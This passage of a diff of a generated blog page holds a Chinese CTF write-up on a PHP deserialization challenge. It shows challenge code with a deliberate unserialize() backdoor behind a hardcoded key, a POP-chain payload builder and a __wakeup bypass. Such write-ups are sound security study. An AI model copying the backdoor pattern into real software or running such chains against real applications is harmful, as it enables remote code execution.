class="line"></span><br><span class="line">class Debug</span><br><span class="line">&#123;</span><br><span class="line">    public $var1;</span><br><span class="line">    public $var2;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;var1 = &#x27;Hnu&#x27;;</span><br><span class="line">        $this-&gt;var2 = &#x27;Sec&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function checkFunc()</span><br><span class="line">    &#123;</span><br><span class="line">        ($this-&gt;var1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;var2-&gt;checkFunc();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class CheckPassword</span><br><span class="line">&#123;</span><br><span class="line">    public $var1;</span><br><span class="line"></span><br><span class="line">    public function checkUserPassword()</span><br><span class="line">    &#123;</span><br><span class="line">        // Use your own password file instead.</span><br><span class="line">        include &quot;Se23dfddfes35s.php&quot;;</span><br><span class="line">        echo $FLAG;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;checkUserPassword();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        return __CLASS__;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#x27;username&#x27;]) &amp;&amp; isset($_POST[&#x27;password&#x27;])) &#123;</span><br><span class="line">    $username = $_POST[&#x27;username&#x27;];</span><br><span class="line">    $password = $_POST[&#x27;password&#x27;];</span><br><span class="line">    if ($username == &#x27;admin&#x27; &amp;&amp; $password == &#x27;-d2@3e*df0e_fk3&#x27;) &#123;</span><br><span class="line">        echo &#x27;&lt;script&gt;alert(&quot;猜对了，可是这又有什么用呢？&quot;)&lt;/script&gt;&#x27;;</span><br><span class="line">        echo &#x27;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=index.html&quot;&gt;&#x27;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &#x27;&lt;script&gt;alert(&quot;密码错误，继续猜!&quot;)&lt;/script&gt;&#x27;;</span><br><span class="line">        echo &#x27;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=index.html&quot;&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#x27;B4CK_D00R&#x27;]) &amp;&amp; $_GET[&#x27;K3Y_A&#x27;] == &#x27;-d2@3e*df0e_fk3&#x27;) &#123;</span><br><span class="line">    $a = $_POST[&#x27;B4CK_D00R&#x27;];</span><br><span class="line">    unserialize($a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-倒推的pop链
-
-> 1.CheckPassword->checkUserPassword 2.CheckPassword->__invoke 3.Debug->checkFunc 4.Debug-> __toString() 5.User->__destruct
-
-还有一个wakeup绕过
-
-因此,我们构造时就要反过来
-
+<p>倒推的pop链</p>
+<blockquote>
+<p>1.CheckPassword-&gt;checkUserPassword 2.CheckPassword-&gt;__invoke 3.Debug-&gt;checkFunc 4.Debug-&gt; __toString() 5.User-&gt;__destruct</p>
+</blockquote>
+<p>还有一个wakeup绕过</p>
+<p>因此,我们构造时就要反过来</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">class User</span><br><span class="line">&#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public $password;</span><br><span class="line">    public $isAdmin = true;</span><br><span class="line">    public $class;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line">class Debug</span><br><span class="line">&#123;</span><br><span class="line">    public $var1;</span><br><span class="line">    public $var2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class CheckPassword</span><br><span class="line">&#123;</span><br><span class="line">    public $var1;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// if (isset($_POST[&#x27;B4CK_D00R&#x27;]) &amp;&amp; $_GET[&#x27;K3Y_A&#x27;] == &#x27;-d2@3e*df0e_fk3&#x27;) &#123;</span><br><span class="line">//     $a = $_POST[&#x27;B4CK_D00R&#x27;];</span><br><span class="line">//     unserialize($a);</span><br><span class="line">// &#125;</span><br><span class="line"></span><br><span class="line">$a=new User();</span><br><span class="line">$a-&gt;class=new Debug();</span><br><span class="line">$a-&gt;class-&gt;var2=new Debug();</span><br><span class="line">$a-&gt;class-&gt;var1=new CheckPassword();</span><br><span class="line">$a1=serialize($a);</span><br><span class="line">$b=preg_replace(&#x27;/4:&#123;s:8/&#x27;,&#x27;5:&#123;s:8&#x27;,$a1);</span><br><span class="line">echo ($b);</span><br></pre></td></tr></table></figure>
 
-$a->class->var2=new Debug();
-
-$a->class->var1=new CheckPassword();这个地方犯了一个错,
-
-其实也还是因为反序列化不够熟悉吧,这个我们需要的是通过var2调用到checkfunc这个函数,再利用函数内的var1去调用CheckPassword,但是按照我所写的那样赋值的话,var1与var2是同等级的关系,所以,我们要分开写
-
+<p>$a-&gt;class-&gt;var2&#x3D;new Debug();</p>
+<p>$a-&gt;class-&gt;var1&#x3D;new CheckPassword();这个地方犯了一个错,</p>
+<p>其实也还是因为反序列化不够熟悉吧,这个我们需要的是通过var2调用到checkfunc这个函数,再利用函数内的var1去调用CheckPassword,但是按照我所写的那样赋值的话,var1与var2是同等级的关系,所以,我们要分开写</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$a=new User();</span><br><span class="line">$b1=new Debug();</span><br><span class="line">$b2=new Debug();</span><br><span class="line">$c=new CheckPassword();</span><br><span class="line">$a-&gt;class=$b1;</span><br><span class="line">$b1-&gt;var2=new $b2;</span><br><span class="line">$b1-&gt;var2-&gt;var1=$c;</span><br><span class="line">$a1=serialize($a);</span><br><span class="line">echo ($a1);</span><br></pre></td></tr></table></figure>
 
-然后再绕过wakeup修改debug的成员数量即可
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/c840bc4e-image.png)
-
-应该就可以得到flag了
-
----
-
-来源: https://www.yuque.com/guansuanbangzhuangganjun/oxmbxg/rapbgq0rhm9vm7u1
-语雀文档ID: 137058815
-
+<p>然后再绕过wakeup修改debug的成员数量即可</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/c840bc4e-image.png" alt="image.png"></p>
+<p>应该就可以得到flag了</p>
+<hr>
+<p>来源: <a target="_blank" rel="noopener" href="https://www.yuque.com/guansuanbangzhuangganjun/oxmbxg/rapbgq0rhm9vm7u1">https://www.yuque.com/guansuanbangzhuangganjun/oxmbxg/rapbgq0rhm9vm7u1</a><br>语雀文档ID: 137058815</p>
 
     </div>
 
@@ -384,9 +340,11 @@ $a->class->var1=new CheckPassword();这个地方犯了一个错,
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"># Web安全</a>
               <a href="/tags/CTF/" rel="tag"># CTF</a>
               <a href="/tags/Writeup/" rel="tag"># Writeup</a>
+              <a href="/tags/HNUCTF/" rel="tag"># HNUCTF</a>
+              <a href="/tags/PHP/" rel="tag"># PHP</a>
+              <a href="/tags/%E5%BC%B1%E7%B1%BB%E5%9E%8B/" rel="tag"># 弱类型</a>
           </div>
 
         
@@ -395,8 +353,8 @@ $a->class->var1=new CheckPassword();这个地方犯了一个错,
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2026/09/16/04-Nssctf/" rel="prev" title="Nssctf">
-      <i class="fa fa-chevron-left"></i> Nssctf
+    <a href="/2026/09/16/03-hgane/" rel="prev" title="hgane">
+      <i class="fa fa-chevron-left"></i> hgane
     </a></div>
       <div class="post-nav-item">
     <a href="/2026/09/16/06-%E6%AF%94%E8%B5%9Bwp/" rel="next" title="比赛wp">
@@ -460,6 +418,7 @@ $a->class->var1=new CheckPassword();这个地方犯了一个错,
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#wp"><span class="nav-number">1.</span> <span class="nav-text">wp</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#1"><span class="nav-number">2.</span> <span class="nav-text">1.</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2"><span class="nav-number">3.</span> <span class="nav-text">2.</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#3"><span class="nav-number">4.</span> <span class="nav-text">3.</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#4"><span class="nav-number">5.</span> <span class="nav-text">4.</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#5"><span class="nav-number">6.</span> <span class="nav-text">5.</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -475,7 +434,7 @@ $a->class->var1=new CheckPassword();这个地方犯了一个错,
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">72</span>
+          <span class="site-state-item-count">64</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -488,7 +447,7 @@ $a->class->var1=new CheckPassword();这个地方犯了一个错,
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-count">94</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
